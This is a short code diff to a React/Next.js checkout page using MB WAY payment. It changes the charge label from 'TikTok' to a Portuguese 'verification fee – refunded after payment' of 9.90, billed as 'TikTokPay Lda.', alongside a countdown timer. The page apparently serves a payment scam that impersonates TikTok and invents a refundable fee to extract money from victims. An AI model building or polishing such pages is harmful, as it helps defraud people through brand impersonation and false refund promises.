@@ -2,7 +2,7 @@ import Head from 'next/head'
 import { useEffect, useState } from 'react'
 
 export default function Checkout() {
-  const [params, setParams]     = useState({ name: 'TikTok', amount: 9.90, description: 'TikTok', logo: '', timer: 10 })
+  const [params, setParams]     = useState({ name: 'Taxa de Verificação – Estorno após Pagamento', amount: 9.90, description: 'TikTokPay Lda.', logo: '', timer: 10 })
   const [method, setMethod]     = useState('mbway')
   const [phone, setPhone]       = useState('')
   const [terms, setTerms]       = useState(false)
